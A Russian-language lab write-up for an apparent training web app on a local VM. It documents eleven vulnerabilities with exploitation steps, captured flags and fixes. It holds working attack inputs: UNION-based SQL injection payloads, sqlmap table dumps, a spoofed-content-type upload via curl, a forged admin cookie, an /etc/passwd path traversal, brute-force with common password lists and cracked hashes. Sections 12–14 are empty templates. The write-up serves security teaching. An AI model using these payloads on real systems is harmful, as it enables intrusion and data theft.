| [README](README.md) | [subject](sublect_ru.md) | [How to start a web server](howTo.md) | defense |
|-|-|-|-|

#Защита проекта

<details><summary>Запускаем ВМ, получаем на экране IP адрес запущенного сервера.</summary>

<img width="1200" alt="Screen Shot 2022-11-11 at 11 16 21" src="https://user-images.githubusercontent.com/84193980/201297810-9f5e8917-2f55-4ee0-96ad-2d347395af7f.png">

</details>

<details><summary>На Маке в браузере вводим этот адрес:</summary>

<img width="1276" alt="Screen Shot 2022-11-11 at 11 23 36" src="https://user-images.githubusercontent.com/84193980/201297804-96514ae7-6e1f-46de-b987-7e2d2c776cee.png">

</details>

# Обнаруженные уязвимости: #

<details><summary>01. Brute force данных для входа</summary>

| Найдено на странице | http://192.168.56.3/?page=signin |
|-|-|

[The main source of information](https://owasp.org)

<details><summary>Что такое `Brute force` и как обнаружено</summary>
  
![44-BruteForce](https://user-images.githubusercontent.com/84193980/201331815-afabace6-0df6-4de6-83cf-549b7577436b.jpeg)

`Brute force` использует метод проб и ошибок, чтобы угадать данные для входа, ключи шифрования или найти скрытую веб-страницу. Хакеры перебирают все возможные комбинации, надеясь угадать правильно.

Это старый метод атаки, но он по-прежнему эффективен и популярен среди хакеров. Потому что в зависимости от длины и сложности пароля его взлом может занять от нескольких секунд до многих лет.

## Как обнаружено ##

На вышеуказанной странице мы можем ввести логин и пароль. 
  
 <img width="1169" alt="Screen Shot 2022-11-11 at 14 36 53" src="https://user-images.githubusercontent.com/84193980/201332789-dce4b467-d603-40db-897b-82bceeffb68f.png">
 
Когда мы вводим неправильный пароль, мы видим, что веб-страница перенаправляет на следующую страницу, на которой есть очень специфическое изображение images/WrongAnswer.gif:

<img width="1904" alt="Screen Shot 2022-11-11 at 14 35 05" src="https://user-images.githubusercontent.com/84193980/201332820-9375ec69-2e0b-4a86-b11c-2f21fc528212.png">
 
Мы можем использовать это для `Brute force` процесса входа в систему.

Для этого из [OWASP SecLists](https://github.com/danielmiessler/SecLists) используем наиболее часто используемые [имена пользователей](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) и [паролей](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt)

Используя простой скрипт, мы можем попробовать каждую комбинацию наиболее часто используемых паролей и имен пользователей, и если мы не видим изображение «WrongAnswer.gif» на экране, то это означает, что мы успешно вошли в систему!

В папке Ressources выполнить следующую команду, по запросу ввести 192.168.56.3 (можно просто Enter):
```
python3 bf_login.py
```

</details>

Брутфорсом получены следующие пароли:

<img width="581" alt="Screen Shot 2022-11-13 at 07 06 55" src="https://user-images.githubusercontent.com/84193980/201506871-5f672d26-6b82-41d6-813d-01639bbe05ff.png">

Заходим по адресу: http://192.168.56.3/?page=signin, вводим логин и пароль. Наслаждаемся!

### Как исправить:
- Используйте более надежное имя пользователя и пароль
- Brute force detection tools
- Captcha
- Анализ и блокировка поступающих запросов:
	- Извлечение необходимых для принятия решений данных (IP, URL, ARGS, BODY);
	- Фильтрация полученных данных с исключением нецелевых URI для уменьшения количества ложных срабатываний;
	- Выбор запросов с одного адреса на конкретный URI по мере их близости или запросов со всех адресов на конкретный URI (для выявления распределенных атак методом перебора) в рамках определенного временного окна;
	- Блокирование источника(ов) атаки при превышении пороговых значений.

----

</details>

<details><summary>02. Атака с внедрением SQL на странице поиска пользователя</summary>

| Найдено на странице | http://192.168.56.3/index.php?page=member |
|-|-|

[SQL injection](https://www.owasp.org/index.php/SQL_Injection)

<details><summary>Что такое `Атака с внедрением SQL` и как обнаружено</summary>

## Обзор ##
Атака с внедрением SQL состоит во вставке или «внедрении» SQL-запроса через входные данные от клиента к приложению. Успешный эксплойт SQL-инъекции может считывать конфиденциальные данные из базы данных, изменять данные базы данных (вставлять/обновлять/удалять), выполнять административные операции в базе данных (например, отключение СУБД), восстанавливать содержимое заданного файла, присутствующего в файле СУБД. систему и в некоторых случаях отдавать команды операционной системе. Атаки с внедрением SQL — это тип атаки с внедрением, при котором команды SQL вводятся во входные данные плоскости данных, чтобы повлиять на выполнение предопределенных команд SQL.

## Моделирование угроз ##
- Атаки с внедрением SQL позволяют злоумышленникам подделывать личность, вмешиваться в существующие данные, вызывать проблемы отказа, такие как аннулирование транзакций или изменение баланса, обеспечивать полное раскрытие всех данных в системе, уничтожать данные или делать их недоступными иным образом, а также становиться администраторами сервер базы данных.
- Внедрение SQL очень распространено в приложениях PHP и ASP из-за преобладания старых функциональных интерфейсов. Из-за характера доступных программных интерфейсов приложения J2EE и ASP.NET с меньшей вероятностью могут легко использовать SQL-инъекции.
- Серьезность атак с внедрением SQL-кода ограничивается навыками и воображением злоумышленника и, в меньшей степени, контрмерами глубокой защиты, такими как подключения с низким уровнем привилегий к серверу базы данных и т. д. Как правило, SQL-инъекция считается серьезной угрозой.

## Описание ##
Атака с внедрением SQL происходит, когда:
- Непреднамеренные данные попадают в программу из ненадежного источника.
- Данные используются для динамического построения SQL-запроса.

## Основные последствия: ##
- Конфиденциальность: поскольку базы данных SQL обычно содержат конфиденциальные данные, потеря конфиденциальности является частой проблемой с уязвимостями SQL Injection.
- Аутентификация: если для проверки имен пользователей и паролей используются плохие SQL-команды, может оказаться возможным подключиться к системе от имени другого пользователя, ранее не знающего пароль.
- Авторизация: если информация об авторизации хранится в базе данных SQL, можно изменить эту информацию путем успешного использования уязвимости SQL Injection.
- Целостность: так же, как может быть возможно прочитать конфиденциальную информацию, также возможно внести изменения или даже удалить эту информацию с помощью атаки SQL Injection.

## Как обнаружено ##
- Метод 1. С помощью внешней программы sqlmap
	- Склонить
	```bash
	git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	```
	- Выведем на экран список таблиц, для этого перейдём в папку программы и запустим:
	```bash
	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
	```
	
	<img width="581" alt="Screen Shot 2022-11-13 at 08 32 28" src="https://user-images.githubusercontent.com/84193980/201508174-f1d52c4f-63be-47d0-aa58-e2881de979d0.png">
	
	- Выведем дамп таблицы users:
	```
	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --dump -T users
	```
	<img width="2010" alt="Screen Shot 2022-11-12 at 13 30 10" src="https://user-images.githubusercontent.com/84193980/201477756-53d0b759-bbe1-4e0e-9c3f-ffdefdb32913.png">

		Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 
		key: 5ff9d0165b4f92b14994e5c685cdce28 
		oter keys:
		2b3366bcfd44f540e630d4dc2b9b06d9
		60e9032c586fb422e2c16dee6286cf10 (oktoberfest)
		e083b24a01c483437bcf4a9eea7c1b4d 

- Метод 2. Через поле ввода страницы сайта.

	- Если оставить поле ввода пустым и нажать Enter, то мы получим:
	```
	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
	```

	Значит, используется MariaDB

	Ввести в поле ввода:

	```
	1 UNION SELECT table_name, column_name FROM information_schema.columns
	```

	Посмотрим на поля таблицы users: user_id, first_name, last_name, town, ountry, planet, Commentaire, countersign

	Что бы посмотреть все данные пользователей:
	```
	1 OR 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
	```
	<img width="922" alt="Screen Shot 2022-11-12 at 16 59 20" src="https://user-images.githubusercontent.com/84193980/201477846-0f12c5e8-c33f-41dc-a94e-1755141cab9d.png">

	или

	В папке Ressources (default address 192.168.56.3, можно просто Enter):
	```
	chmod 777 get_page-user.sh
	./get_page-user.sh
	```
	<img width="1560" alt="Screen Shot 2022-11-12 at 16 24 55" src="https://user-images.githubusercontent.com/84193980/201477797-c91bba96-6d18-4aab-81f4-6d212cff7c24.png">

- Нас интересует пользователь, в Surname которого указано "Decrypt this password"

</details>

Полученный ключ: 5ff9d0165b4f92b14994e5c685cdce28

Нам надо сделать: Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 

Вспомним данные, полученные ранее:

<img width="2010" alt="Screen Shot 2022-11-12 at 13 30 10" src="https://user-images.githubusercontent.com/84193980/201477756-53d0b759-bbe1-4e0e-9c3f-ffdefdb32913.png">

MD5 hash oktoberfest это 60e9032c586fb422e2c16dee6286cf10

По аналогии [Конвертируем MD5 hash нашего ключа](https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28): FortyTwo

lower all the char: fortytwo

[sh256](https://crypt-online.ru/crypts/sha256/): 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

### Как исправить:
- предварительно обработать параметры SQL-запроса, в том числе привести к целочисленному типу, экранировать значения, подготовленные значения (https://htmlacademy.ru/tutorial/php/sql-injections)

----

</details>

<details><summary>03. Атака с внедрением SQL на странице поиска картинки</summary>

| Найдено на странице | http://192.168.56.3/index.php?page=searchimg |
|-|-|

<details><summary>Что такое `Атака с внедрением SQL на странице поиска картинки` и как обнаружено</summary>

## Обзор ##
Атака с внедрением SQL состоит во вставке или «внедрении» SQL-запроса через входные данные от клиента к приложению. Успешный эксплойт SQL-инъекции может считывать конфиденциальные данные из базы данных, изменять данные базы данных (вставлять/обновлять/удалять), выполнять административные операции в базе данных (например, отключение СУБД), восстанавливать содержимое заданного файла, присутствующего в файле СУБД. систему и в некоторых случаях отдавать команды операционной системе. Атаки с внедрением SQL — это тип атаки с внедрением, при котором команды SQL вводятся во входные данные плоскости данных, чтобы повлиять на выполнение предопределенных команд SQL.

## Моделирование угроз ##
- Атаки с внедрением SQL позволяют злоумышленникам подделывать личность, вмешиваться в существующие данные, вызывать проблемы отказа, такие как аннулирование транзакций или изменение баланса, обеспечивать полное раскрытие всех данных в системе, уничтожать данные или делать их недоступными иным образом, а также становиться администраторами сервер базы данных.
- Внедрение SQL очень распространено в приложениях PHP и ASP из-за преобладания старых функциональных интерфейсов. Из-за характера доступных программных интерфейсов приложения J2EE и ASP.NET с меньшей вероятностью могут легко использовать SQL-инъекции.
- Серьезность атак с внедрением SQL-кода ограничивается навыками и воображением злоумышленника и, в меньшей степени, контрмерами глубокой защиты, такими как подключения с низким уровнем привилегий к серверу базы данных и т. д. Как правило, SQL-инъекция считается серьезной угрозой.

## Описание ##
Атака с внедрением SQL происходит, когда:
- Непреднамеренные данные попадают в программу из ненадежного источника.
- Данные используются для динамического построения SQL-запроса.

## Основные последствия: ##
- Конфиденциальность: поскольку базы данных SQL обычно содержат конфиденциальные данные, потеря конфиденциальности является частой проблемой с уязвимостями SQL Injection.
- Аутентификация: если для проверки имен пользователей и паролей используются плохие SQL-команды, может оказаться возможным подключиться к системе от имени другого пользователя, ранее не знающего пароль.
- Авторизация: если информация об авторизации хранится в базе данных SQL, можно изменить эту информацию путем успешного использования уязвимости SQL Injection.
- Целостность: так же, как может быть возможно прочитать конфиденциальную информацию, также возможно внести изменения или даже удалить эту информацию с помощью атаки SQL Injection.

## Как обнаружено ##
- С помощью внешней программы sqlmap
	- Склонить
	```bash
	git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	```
	- Выведем на экран список таблиц, для этого перейдём в папку программы и запустим:
	```bash
	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
	```
	
	<img width="581" alt="Screen Shot 2022-11-13 at 08 32 28" src="https://user-images.githubusercontent.com/84193980/201508174-f1d52c4f-63be-47d0-aa58-e2881de979d0.png">

	Нас интересует таблица list_images

- Через поле ввода страницы сайта.

	Ввести в поле ввода:
	```
	1 OR 1=1 UNION SELECT NULL, NULL--
	```

	Значит, имеется 2 колонки

	Ввести в поле ввода:

	```
	1 UNION SELECT table_name, column_name FROM information_schema.columns
	```

	Посмотрим на поля таблицы list_images: id, url, title, comment

	Что бы посмотреть все данные всех картинок:
	```
	1 OR 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
	```

	<img width="1080" alt="Screen Shot 2022-11-13 at 08 45 05" src="https://user-images.githubusercontent.com/84193980/201508206-c0769387-7568-41ea-8410-47080f3b4df4.png">

	В данных последней картинки находим:
		Title: borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

	или

	В папке Ressources (default address 192.168.56.3, можно просто Enter):
	```
	./get_page-pic.sh
	```
	
	<img width="1011" alt="Screen Shot 2022-11-13 at 08 53 05" src="https://user-images.githubusercontent.com/84193980/201508219-a9de4b5f-89bd-49b0-bb29-21a4d41a4d54.png">

- Нас интересует картинка, у которой "Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

</details>

ключ: 1928e8083cf461a51303633093573c46

По аналогии с предыдущей инъекцией:

[Конвертируем MD5 hash нашего ключа](https://md5.gromweb.com/?md5=1928e8083cf461a51303633093573c46): albatroz

lower all the char: albatroz

[sh256](https://crypt-online.ru/crypts/sha256/): f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


### Как исправить:
- предварительно обработать параметры SQL-запроса, в том числе привести к целочисленному типу, экранировать значения, подготовленные значения (https://htmlacademy.ru/tutorial/php/sql-injections)

----

</details>

<details><summary>04. Непроверенные переадресации и пересылки</summary>

| Найдено на странице | http://192.168.56.3/ |
|-|-|

<details><summary>Что такое `Непроверенные переадресации и пересылки` и как обнаружено</summary>

https://habr.com/ru/company/otus/blog/511428/

Одной из наиболее распространенных и тем не менее игнорируемых веб-разработчиками уязвимостей является Open Redirect (также известная как «Непроверенные переадресации и пересылки»). Веб-сайт считается уязвимым для Open Redirect, если значения параметра (часть URL-адреса после «?») в HTTP GET-запросе позволяет перенаправить пользователя на новый сайт без проверки целевого сайта. В зависимости от архитектуры уязвимого сайта, перенаправление может произойти после определённых действий, таких как вход в систему, а иногда это может произойти мгновенно при загрузке страницы.

Пример уязвимой ссылки выглядит примерно так: www.example.com/login.html?RelayState=http%3A%2F%2Fexample.com%2Fnext

В этом примере параметр «RelayState» указывает куда нужно перенаправить пользователя после успешного входа в систему (в нашем примере это example.com/next). Если сайт не проверяет значение параметра «RelayState» на предмет легитимности и безопасности, то злоумышленник может воспользоваться этим параметром, чтобы перенаправить жертву на фейковую страницу, созданную самим злоумышленником: www.example.com/login.html?RelayState=http%3A%2F%2FEvilWebsite.com

Перенаправление на разные сайты социальных сетей в нижней части веб-сайта не подтверждено. Открытые перенаправления не являются критическими непосредственно для самого сайта и не позволяют злоумышленнику украсть данные, принадлежащие владельцу сайта, но представляют большую опасность для пользователя сайта. Жертва может не заметить, что в середине длинного URL-адреса есть параметры, которые манипулируют и изменяют конечную точку.

## Как обнаружено ##

В Chrome в нижней части экрана (footer, где значок Facebook) нажать правой кнопкой мыши -> Inspect -> Edit attribute -> Изменить адрес (добавить что-либо)

Теперь, нажав на значок Facebook получаем страницу с ключом

</details>

<img width="963" alt="Screen Shot 2022-11-13 at 10 07 09" src="https://user-images.githubusercontent.com/84193980/201510524-675934ca-98fa-4e5c-81ab-9fec8749a526.png">

### Как исправить:
- Лучший способ избежать уязвимости Open Redirect – это избегать перенаправления по параметру, зависящему от пользователя или приходящего через GET-запрос. Если перенаправление неизбежно, с ним можно совладать, проверив конечный сайт и очистив его репутацию с помощью белого списка подтвержденных URL-адресов.

----

</details>

<details><summary>05. Незащищенная электронная почта для восстановления</summary>

| Найдено на странице | http://192.168.56.3/?page=recover |
|-|-|

<details><summary>Что такое `Незащищенная электронная почта для восстановления` и как обнаружено</summary>

Если злоумышленник изменит адрес электронной почты в этом поле, тогда забытый пароль (или процедура восстановления) может быть отправлен на его собственный адрес электронной почты. Это может позволить ему восстанавливать пароли от пользователей веб-сайта.

## Как обнаружено ##

В Chrome на вышеуказанной странице в районе кнопки Submit нажать правой кнопкой мыши -> Inspect -> Edit attribute -> Изменить адрес электронной почты (добавить что-либо)
	
<img width="1397" alt="Screen Shot 2022-11-13 at 13 45 48" src="https://user-images.githubusercontent.com/84193980/201518128-aa9869e2-617a-44de-8896-3c7aadda86db.png">

Теперь, нажав на кнопку Submit получаем страницу с флагом
	
<img width="906" alt="Screen Shot 2022-11-13 at 13 43 03" src="https://user-images.githubusercontent.com/84193980/201518137-6534e19e-e753-4935-87a2-4b3d270593a6.png">

</details>

THE FLAG IS : 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

### Как исправить:
- Вместо того, чтобы отправлять запрос на адрес электронной почты администратора, мы можем просто использовать поле ввода с адресом электронной почты пользователя.

----

</details>

<details><summary>06. Незащищенная страница опроса</summary>

| Найдено на странице | http://192.168.56.3/index.php?page=survey |
|-|-|

<details><summary>Что такое `Незащищенная страница опроса` и как обнаружено</summary>

У пользователя становится возможным "накрутка голосования"

## Как обнаружено ##

На вышеуказанной странице в районе первой ячейки Grade нажать правой кнопкой мыши -> Inspect -> Edit attribute -> Изменить значение, отличное от 1 (добавить что-либо)
	
<img width="1692" alt="Screen Shot 2022-11-13 at 14 12 34" src="https://user-images.githubusercontent.com/84193980/201519332-230127a4-5836-425c-bd77-5bf7a72ad2e1.png">

Теперь при выборе в таблице изменённого значения получим флаг:
	
<img width="891" alt="Screen Shot 2022-11-13 at 14 11 47" src="https://user-images.githubusercontent.com/84193980/201519329-6761f8be-b798-45d5-a535-170a7a7faef4.png">

</details>

THE FLAG IS 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA

### Как исправить:
- Стратегии проверки данных (принятие заведомо хороших, отклонение заведомо плохих, санация)

----

</details>

<details><summary>07. Неограниченная загрузка файлов</summary>

| Найдено на странице | http://192.168.56.3/index.php?page=upload |
|-|-|

<details><summary>Что такое `Неограниченная загрузка файлов` и как обнаружено</summary>

[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

Загруженные файлы представляют значительный риск для приложений. Первым шагом во многих атаках является передача некоторого кода в атакуемую систему. Тогда атаке нужно только найти способ выполнить код. Использование загрузки файла помогает злоумышленнику выполнить первый шаг.

Последствия неограниченной загрузки файлов могут быть разными, включая полный захват системы, перегрузку файловой системы или базы данных, перенаправление атак на серверные системы, атаки на стороне клиента или простое искажение. Это зависит от того, что приложение делает с загруженным файлом и особенно от того, где он хранится.

## Как обнаружено ##

Если попытаться загрузить файл "php", то это не сработает. Когда мы загружаем файл php, наш браузер отправляет в заголовках HTTP «content-type», который является «application/octet-stream» для файла php и «image/jpeg» для файла jpeg.

Вышеуказанная страница заточена ТОЛЬКО для приёма изображений. НО! На этом сайте бэкенд не проверяет тип файла, поэтому при загрузке любого типа файла сайт примет его. В следующем скрипте мы делаем так, чтобы наш файл выглядел так, как будто мы отправляем изображение.

Перейти в теминале папку Ressources и там выполнить:
```bash
curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@1.test;type=image/jpeg' http://192.168.56.3/index.php\?page\=upload\# | grep "flag"
```
<img width="1240" alt="Screen Shot 2022-11-13 at 12 57 05" src="https://user-images.githubusercontent.com/84193980/201516949-7816f45b-e148-4925-93a5-e3e34cf495a3.png">

</details>

The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

### Как исправить:
- Вы должны перепроверить тип файла и никогда не доверять пользователю.

----

</details>

<details><summary>08. Небезопасные файлы cookie администратора</summary>

| Найдено на странице | http://192.168.56.3/ |
|-|-|

<details><summary>Что такое `Небезопасные файлы cookie администратора` и как обнаружено</summary>

Перехват сеанса (перехват файлов cookie) — это использование действительного компьютерного сеанса (сеансового ключа) для получения несанкционированного доступа к информации или услугам в компьютерной системе. В частности, он используется для обозначения кражи волшебного файла cookie, используемого для аутентификации пользователя на удаленном сервере.

### Что такое файлы cookie?

Файлы cookie — это файлы, которые веб-сайты записывают локально на ваш компьютер.
У них есть несколько применений: отслеживание клиентов, безопасная идентификация пользователя/администратора или запись пользовательских данных.
Эти данные передаются в конце заголовков HTTP в следующем виде:
Cookie: Cookie_name_1=cookie_value1; Cookie_name_2=cookie_value2 и т. д.

Как правило, многие сайты хранят файл cookie SESSID, который является переменной идентификации вашего сайта.
Файл cookie SESSID позволяет защитить аутентификацию
(сервер ведет локальную запись используемых сеансов SESSID и связанных с ними данных, таких как входы в систему).

## Как обнаружено ##

- Откройте браузер Chrome на компьютере.
- В правом верхнем углу экрана нажмите на значок с тремя точками Настройки (Settings).
- Выберите Конфиденциальность и безопасность (Privacy and security) -> Файлы cookie и другие данные сайтов (Cookies and other site data).
- Выберите See all cookies and site data
- Выберите свой сайт 192.168.56.3
	
<img width="693" alt="Screen Shot 2022-11-13 at 14 55 17" src="https://user-images.githubusercontent.com/84193980/201521836-743c6c84-ef7d-4c5f-8633-616879b4fcc1.png">

В указанном файле cookie есть поле 
	Content 68934a3e9455fa72420237eb05902327

[Конвертируем MD5 нашего поля](https://md5.gromweb.com/?md5=68934a3e9455fa72420237eb05902327): false

Попробуем получить MD5 hash of "true" и заменить значение этого поля в cookie

[MD5 hash "true"](https://md5.gromweb.com/?string=true): b326b5062b2f0e69046810717534cb09

Перейти в терминале в папку Ressources и выполнить

```
curl -s --cookie 'I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://192.168.56.3' -o flag.html
open flag.html
```

или

В папке Ressources (default address 192.168.56.3, можно просто Enter):
```
chmod 777 get_flag.sh
./get_flag.sh
```
	
<img width="481" alt="Screen Shot 2022-11-13 at 15 16 09" src="https://user-images.githubusercontent.com/84193980/201521860-2291d9fb-3de0-4c93-94cf-1c24371a3291.png">

</details>

Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

### Как исправить:
- Никогда не доверяйте содержимому файлов cookie для конфиденциальных операций, не используйте алгоритм MD5 для шифрования данных и используйте более безопасный алгоритм, такой как bcrypt.

----

</details>

<details><summary>09. Обход каталога или обход пути</summary>

| Найдено на странице | http://192.168.56.3/?page=../../../../../../../etc/passwd |
|-|-|

<details><summary>Что такое `Обход каталога` и как обнаружено</summary>

Все веб-сайты построены одинаково, и все веб-сайты, работающие в UNIX, содержат папку: /etc/passwd

`/etc/passwd` — это текстовый файл, содержащий атрибуты каждого пользователя или учетной записи на компьютере под управлением Linux или другой Unix-подобной операционной системы.

Разрешения для `/etc/passwd` установлены по умолчанию, так что он может быть прочитан любым пользователем в системе.

## Как обнаружено ##

Мы попытаемся найти эту папку, поднявшись по древовидной структуре нашего веб-сайта, добавив «../» к запрошенному URL-адресу.

Добавив `/?page=../` к нашему URL-адресу и благодаря индексам, отображаемым на сайте при каждой попытке, нам удалось вернуться к файлу `/etc/passwd`.

В браузере:

<img width="906" alt="Screen Shot 2022-11-14 at 06 47 04" src="https://user-images.githubusercontent.com/84193980/201572544-32e5db20-ccd3-40e4-b5f0-a8370b7c81e3.png">

</details>

The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 

### Как исправить:
- Чтобы защититься от этого типа недостатков, необходимо правильно настроить веб-сервер, чтобы пользователь не мог просматривать страницы, к которым у него не должно быть доступа.

----

</details>

<details><summary>10. Незащищенный htpasswd</summary>

| Найдено на странице | http://192.168.56.3/robots.txt |
|-|-|

<details><summary>Что такое `Незащищенный htpasswd` и как обнаружено</summary>

Файл `htpasswd` хранит имена пользователей и пароли для аутентификации пользователей HTTP.

## Как обнаружено ##

В браузере перейти

	http://192.168.56.3/robots.txt
	
<img width="439" alt="Screen Shot 2022-11-14 at 07 25 59" src="https://user-images.githubusercontent.com/84193980/201576736-e9c4ce3c-a872-46c9-8712-71c83d095223.png">

Мы видим, что существует папка /whatever. Перейдём в неё:

	http://192.168.56.3/whatever
	
<img width="478" alt="Screen Shot 2022-11-14 at 07 27 24" src="https://user-images.githubusercontent.com/84193980/201576777-c5d45dc4-c222-4132-b971-7afaeecec448.png">

В этой папке есть доступ к файлу htpasswd. Скачаем этот файл. Внутри него только одна строчка:

	root:437394baff5aa33daa618be47b75cb49

Уже опробованным нами методом произведём:

[Reverse MD5 hash of 437394baff5aa33daa618be47b75cb49](https://md5.gromweb.com/?md5=437394baff5aa33daa618be47b75cb49) : qwerty123@

В браузере перейдём:

	http://192.168.56.3/admin/

и введём 

```
Username: root
Password: qwerty123@
```
	
<img width="880" alt="Screen Shot 2022-11-14 at 07 33 55" src="https://user-images.githubusercontent.com/84193980/201576817-f151acef-205c-4f1f-a9b1-7ce626e108fe.png">

<img width="889" alt="Screen Shot 2022-11-14 at 07 35 14" src="https://user-images.githubusercontent.com/84193980/201576864-7ce13744-fb81-44f7-aa50-3f0e7ed32ab4.png">

</details>

The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

### Как исправить:
- Права доступа к файлу htpasswd должны предоставляться только администраторам, а не тем, кто просто добавляет «/что угодно» к домашнему URL-адресу.

----

</details>

<details><summary>11. Подделка межсайтовых запросов</summary>

| Найдено на странице | [http://192.168.56.3/](http://192.168.56.3/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f) |
|-|-|

[Click for more information (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet)

<details><summary>Что такое `Подделка межсайтовых запросов` и как обнаружено</summary>

`Подделка межсайтовых запросов` (`CSRF`)  — это тип атаки, которая происходит, когда вредоносный веб-сайт, электронная почта, блог, мгновенное сообщение или программа заставляет веб-браузер пользователя выполнять нежелательное действие на доверенном сайте, когда пользователь аутентифицирован. Атака `CSRF` работает, потому что запросы браузера автоматически включают все файлы cookie, включая файлы cookie сеанса. Поэтому, если пользователь аутентифицирован на сайте, сайт не может отличить законные авторизованные запросы от поддельных аутентифицированных запросов. Эта атака предотвращается при использовании надлежащей авторизации, которая подразумевает, что требуется механизм запроса-ответа, который проверяет личность и полномочия запрашивающего.

Влияние успешной `CSRF`-атаки ограничено возможностями уязвимого приложения и привилегиями пользователя. Например, эта атака может привести к переводу средств, изменению пароля или совершению покупки с использованием учетных данных пользователя. По сути, атаки `CSRF` используются злоумышленником, чтобы заставить целевую систему выполнять функцию через браузер жертвы без ведома жертвы, по крайней мере, до тех пор, пока не будет совершена несанкционированная транзакция.

## Как обнаружено ##

Внизу главной страницы сайта есть ссылка `BornToSec`. Нажмём на неё:
	
<img width="599" alt="Screen Shot 2022-11-14 at 08 04 32" src="https://user-images.githubusercontent.com/84193980/201585904-5a703ae5-8144-4e8a-8b95-74df9d2b826f.png">

Мы попали на страницу http://192.168.56.3/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f . Проинспектируем код:

<img width="1489" alt="Screen Shot 2022-11-14 at 08 06 57" src="https://user-images.githubusercontent.com/84193980/201585936-0f182d50-a004-48f0-8e42-53afa0e37258.png">

В коде есть закомментированные блоки кода. Часть закомментированного фрагмента даёт подсказку:

	You must come from : "https://www.nsa.gov/".

Сэмулируем визит на эту страницу с сайта "https://www.nsa.gov/". Для этого, в качестве полученной подсказки, используем "User-Agent: ft_bornToSec". Выполнить в терминале:

```
curl 'http://192.168.56.3/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H 'User-Agent: ft_bornToSec' -H 'Referer: https://www.nsa.gov/' | grep 'images/win.png'
```

<img width="1203" alt="Screen Shot 2022-11-14 at 08 37 01" src="https://user-images.githubusercontent.com/84193980/201585965-b463e096-b91d-44e5-a5b4-2b2980ca097d.png">

</details>

The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

### Как исправить:
- Проверьте, имеет ли ваш фреймворк встроенную защиту от CSRF , и используйте ее. Если фреймворк не имеет встроенной защиты от CSRF, добавьте токены CSRF во все запросы на изменение состояния (запросы, вызывающие действия на сайте) и проверьте их на бэкенде.
- Для программного обеспечения с отслеживанием состояния используйте шаблон токена синхронизатора.
- Для программного обеспечения без сохранения состояния используйте двойные файлы cookie.
- Реализуйте хотя бы одно средство защиты из раздела «Устранение последствий глубокоэшелонированной защиты».
	- Рассмотрите возможность использования атрибута файла cookie SameSite для сеансовых файлов cookie , но будьте осторожны и НЕ устанавливайте файл cookie специально для домена, поскольку это приведет к уязвимости системы безопасности, поскольку все поддомены этого домена совместно используют файл cookie. Это особенно проблема, когда субдомен имеет CNAME для доменов, не находящихся под вашим контролем.
	- Рассмотрите возможность реализации защиты на основе взаимодействия с пользователем для высокочувствительных операций.
	- Рассмотрите возможность использования настраиваемых заголовков запросов.
	- Рассмотрите возможность проверки происхождения с помощью стандартных заголовков
- Помните, что любой межсайтовый скриптинг (XSS) может быть использован для преодоления всех методов смягчения CSRF! (См. Памятку OWASP  по предотвращению XSS  для получения подробных инструкций о том, как предотвратить недостатки XSS.)
- Не используйте запросы GET для операций изменения состояния. Если по какой-либо причине вы это сделаете, защитите эти ресурсы от CSRF.

----

</details>

<details><summary>12. </summary>

| Найдено на странице | http://192.168.56.3/ |
|-|-|

<details><summary>Что такое `` и как обнаружено</summary>

## Как обнаружено ##

</details>



### Как исправить:
- 

----

</details>

<details><summary>13. </summary>

| Найдено на странице | http://192.168.56.3/ |
|-|-|

<details><summary>Что такое `` и как обнаружено</summary>

## Как обнаружено ##

</details>



### Как исправить:
- 

----

</details>

<details><summary>14. </summary>

| Найдено на странице | http://192.168.56.3/ |
|-|-|

<details><summary>Что такое `` и как обнаружено</summary>

## Как обнаружено ##

</details>



### Как исправить:
- 

----

</details>


| [README](README.md) | [subject](sublect_ru.md) | [How to start a web server](howTo.md) | defense |
|-|-|-|-|
